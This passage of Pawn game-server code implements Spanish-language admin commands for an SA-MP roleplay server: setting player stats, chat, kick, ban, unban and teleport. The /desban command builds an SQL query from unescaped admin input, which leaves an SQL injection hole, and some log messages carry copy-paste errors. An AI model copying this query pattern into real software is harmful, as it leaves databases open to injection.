	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCoche0' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCoche1",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCoche][1] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCoche1' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCoche2",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCoche][2] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCoche2' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCoche3",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCoche][3] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCoche3' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCoche4",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCoche][4] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCoche4' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCochePrestado0",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCochePrestado][0] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCochePrestado0' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCochePrestado1",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCochePrestado][1] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCochePrestado1' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCochePrestado2",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCochePrestado][2] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCochePrestado2' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCochePrestado3",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCochePrestado][3] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCochePrestado3' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCochePrestado4",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCochePrestado][4] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCochePrestado4' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"MinPayDay",true) == 0)
	{
	    PlayerInfo[playerid2][pMinPayDay] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LlaveCoche4' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LicConduccion",true) == 0)
	{
	    PlayerInfo[playerid2][pLicConduccion] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LicConduccion' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LicNavegacion",true) == 0)
	{
	    PlayerInfo[playerid2][pLicNavegacion] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LicNavegacion' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LicAviacion",true) == 0)
	{
	    PlayerInfo[playerid2][pLicAviacion] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LicAviacion' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LicArmas",true) == 0)
	{
	    PlayerInfo[playerid2][pLicArmas] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LicArmas' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LicPesca",true) == 0)
	{
	    PlayerInfo[playerid2][pLicPesca] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LicPesca' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LicCaza",true) == 0)
	{
	    PlayerInfo[playerid2][pLicCaza] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'LicCaza' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Casa",true) == 0)
	{
	    PlayerInfo[playerid2][pCasa] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Casa' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"CasaAlq",true) == 0)
	{
	    PlayerInfo[playerid2][pCasaAlq] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'CasaAlq' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Negocio",true) == 0)
	{
	    PlayerInfo[playerid2][pNegocio] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Negocio' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Taller",true) == 0)
	{
	    PlayerInfo[playerid2][pTaller] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Taller' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"HabMec",true) == 0)
	{
	    PlayerInfo[playerid2][pHabMec] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabMec' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"HabLad",true) == 0)
	{
	    PlayerInfo[playerid2][pHabLad] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabLad' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"TiempoRobo",true) == 0)
	{
	    PlayerInfo[playerid2][pTiempoRobo] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'TiempoRobo' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Hambre",true) == 0)
	{
	    PlayerInfo[playerid2][pHambre] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Hambre' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    ActualizarHambre(playerid2);
	}
	else if(strcmp(opcion,"Sed",true) == 0)
	{
	    PlayerInfo[playerid2][pSed] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Sed' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    ActualizarSed(playerid2);
	}
	else if(strcmp(opcion,"Adiccion0",true) == 0)
	{
	    PlayerInfo[playerid2][pAdiccion][0] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Adiccion0' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Adiccion1",true) == 0)
	{
	    PlayerInfo[playerid2][pAdiccion][1] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Adiccion1' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Adiccion2",true) == 0)
	{
	    PlayerInfo[playerid2][pAdiccion][2] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Adiccion2' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Adiccion3",true) == 0)
	{
	    PlayerInfo[playerid2][pAdiccion][3] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Adiccion3' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Adiccion4",true) == 0)
	{
	    PlayerInfo[playerid2][pAdiccion][4] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Adiccion4' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"DrConsumida0",true) == 0)
	{
	    PlayerInfo[playerid2][pDrConsumida][0] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'DrConsumida0' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"DrConsumida1",true) == 0)
	{
	    PlayerInfo[playerid2][pDrConsumida][1] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'DrConsumida1' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"DrConsumida2",true) == 0)
	{
	    PlayerInfo[playerid2][pDrConsumida][2] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'DrConsumida02' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"DrConsumida3",true) == 0)
	{
	    PlayerInfo[playerid2][pDrConsumida][3] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'DrConsumida3' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"DrConsumida4",true) == 0)
	{
	    PlayerInfo[playerid2][pDrConsumida][4] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'DrConsumida4' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Fuerza",true) == 0)
	{
	    PlayerInfo[playerid2][pFuerza] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Fuerza' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"CansancioEntrenar",true) == 0)
	{
	    PlayerInfo[playerid2][pCansancioEntrenar] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'CansancioEntrenar' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/adm", true) == 0 || strcmp(cmd, "/administracion", true) == 0) //Dar mensajes generales como admin.
{
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] < 1){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[128];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
			SendClientMessage(playerid, Naranja, "* /(Adm)inistracion [Texto]");
			return 1;
		}
		format(string, sizeof(string), "Administración: %s",result);
		SendClientMessageToAll(Aguamarina,string);
		printf("Mensaje por admin global %s: %s", Nombre, result);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/admin", true) == 0 || strcmp(cmd, "/a", true) == 0) //Chat admin
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
        /*if((noa) && PlayerInfo[playerid][pAdmin] < 5)
        {
			SendClientMessage(playerid,Gris,"Este canal está desactivado!");
			return 1;
        }*/
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[90];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(A)dmin [Texto]");
	    	return 1;
		}
		format(string, sizeof(string), "[N%d] %s: %s", PlayerInfo[playerid][pAdmin], Nombre, result);
		SendAdminMessage(Celeste, string);
		printf("Admin %s: %s", Nombre, result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/kick", true) == 0) //Kickear
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Kick [ID] [Razón]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
            format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[80];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, Naranja, "* /Kick [ID] [Razón]");
                return 1;
            }
            new ano, mes, dia;
            getdate(ano, mes, dia);
            format(string, sizeof(string), "'%s' ha expulsado a '%s'. Motivo: %s (%d/%d/%d)", Nombre, Nombre2, (result), dia, mes, ano);
            SendClientMessageToAll(Rojo, string);
            printf(string);
            TogglePlayerControllable(playerid2,0);
            KickL(playerid2);
            return 1;
        }
    }
    else
    {
        SendClientMessage(playerid, Rojo, "* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/ban", true) == 0) //Banear
{
    if(PlayerInfo[playerid][pAdmin] < 2){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Ban [ID] [Razón]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
            format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[80];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, Naranja, "* /Ban [ID] [Razón]");
                return 1;
            }
            new ano, mes, dia;
            getdate(ano, mes, dia);
            format(string, sizeof(string), "'%s' ha baneado a '%s'. Motivo: %s (%d/%d/%d)", Nombre, Nombre2, (result), dia, mes, ano);
            SendClientMessageToAll(Rojo, string);
            printf(string);
            format(string, sizeof(string), "Has sido baneado por '%s'.", Nombre);
            SendClientMessage(playerid2, Amarillo, string);
            SendClientMessage(playerid2, Amarillo, "Si crees que ha sido un error, toma foto con F8 y pide tu desbán en el foro.");
            TogglePlayerControllable(playerid2,0);
            BanL(playerid2);
            return 1;
        }
    }
    else
    {
        SendClientMessage(playerid, Rojo, "* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/bloquear", true) == 0) //Bloquea cuenta pero no banea
{
    if(PlayerInfo[playerid][pAdmin] < 2){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Bloquear [ID] [Razón]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
            format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[80];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, Naranja, "* /Bloquear [ID] [Razón]");
                return 1;
            }
            new ano, mes, dia;
            getdate(ano, mes, dia);
            format(string, sizeof(string), "'%s' ha bloqueado a '%s'. Motivo: %s (%d/%d/%d)", Nombre, Nombre2, (result), dia, mes, ano);
            SendClientMessageToAll(Rojo, string);
            printf(string);
            format(string, sizeof(string), "Has sido bloqqueado por '%s'.", Nombre);
            SendClientMessage(playerid2, Amarillo, string);
            SendClientMessage(playerid2, Amarillo, "Si crees que ha sido un error, toma foto con F8 y pide tu desbán en el foro.");
            TogglePlayerControllable(playerid2,0);
            PlayerInfo[playerid2][pBloqueado] = 2;
            KickL(playerid2);
            return 1;
        }
    }
    else
    {
        SendClientMessage(playerid, Rojo, "* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desban", true) == 0) //Banear
{
    if(PlayerInfo[playerid][pAdmin] < 3){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
    new offset = idx;
    new result[MAX_PLAYER_NAME];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
        result[idx - offset] = cmdtext[idx];
        idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
        SendClientMessage(playerid, Naranja, "* /Desban [Nombre_Apellido]");
        return 1;
    }
	new query[250];
	format(query, sizeof(query), "UPDATE usuarios SET Bloqueado = 0 WHERE Nombre = '%s'", result);
	mysql_query(1, query);
	format(string, sizeof(string), "'%s' ha desbaneado la cuenta de '%s'.", GetPlayerNameRP(playerid), result);
	SendAdminMessage(Aguamarina, string);
	printf(string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desbanip", true) == 0) //Banear
{
    if(PlayerInfo[playerid][pAdmin] < 3){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
    new offset = idx;
    new result[MAX_PLAYER_NAME];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
        result[idx - offset] = cmdtext[idx];
        idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
        SendClientMessage(playerid, Naranja, "* /DesbanIP [IP]");
        return 1;
    }
    format(string, sizeof(string), "unbanip %s", result);
    SendRconCommand(string);
    SendRconCommand("reloadbans");
	format(string, sizeof(string), "'%s' ha desbaneado la IP [%s].", GetPlayerNameRP(playerid), result);
	SendAdminMessage(Aguamarina, string);
	printf(string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/setvw", true) == 0) //Dar un Virual World a un jugador.
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /SetVW [ID] [VW]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            tmp = strtok(cmdtext, idx);
            new VW = strval(tmp);
			if(!strlen(tmp))
			{
                SendClientMessage(playerid, Naranja, "* /SetVW [ID] [VW]");
                return 1;
			}
            format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
            format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
            format(string, sizeof(string), "'%s' ha cambiado tu Virtual World al %d.", Nombre, VW);
            SendClientMessage(playerid2, AzulClaro, string);
            format(string, sizeof(string), "Has cambiado el Virtual World de '%s' al %d.", Nombre2, VW);
            SendClientMessage(playerid, AzulClaro, string);
            SetPlayerVirtualWorld(playerid2, VW);
            return 1;
        }
    }
    else
    {
        SendClientMessage(playerid, Rojo, "* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/setint", true) == 0) //Dar un interior a un jugador.
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid,Rojo,"* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /SetInt [ID] [Int]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            tmp = strtok(cmdtext, idx);
            new Int = strval(tmp);
			if(!strlen(tmp))
			{
                SendClientMessage(playerid, Naranja, "* /SetInt [ID] [Int]");
                return 1;
			}
            format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
            format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
            format(string, sizeof(string), "'%s' ha cambiado tu interior al %d.", Nombre, Int);
            SendClientMessage(playerid2, AzulClaro, string);
            format(string, sizeof(string), "Has cambiado el interior de '%s' al %d.", Nombre2, Int);
            SendClientMessage(playerid, AzulClaro, string);
            SetPlayerInterior(playerid2, Int);
            return 1;
        }
    }
    else
    {
        SendClientMessage(playerid, Rojo, "* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/jetpack", true) == 0) //Conseguir jetpack
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1){SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1;}
    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/abajo", true) == 0) //Bajar 2 metros
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(playerid, x, y, z-2);
    return 1;
}
	
//---------------------------------------------------------------------------------------------------------------
	
if(strcmp(cmd, "/arriba", true) == 0) //Subir 2 metros
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(playerid, x, y, z+2);
    return 1;
}
	
//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/este", true) == 0) //2 metros a la derecha
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(playerid, x+2, y, z);
    return 1;
}
	
//---------------------------------------------------------------------------------------------------------------
	
if(strcmp(cmd, "/oeste", true) == 0) //2 metros a la izquierda
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(playerid, x-2, y, z);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/norte", true) == 0) //2 metros adelante
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(playerid, x, y+2, z);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------
	
if(strcmp(cmd, "/sur", true) == 0) //2 metros atrás
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    SetPlayerPos(playerid, x, y-2, z);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotopos", true) == 0) //Ir a unas coordenadas
{
	if(PlayerInfo[playerid][pAdmin] < 1) { SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
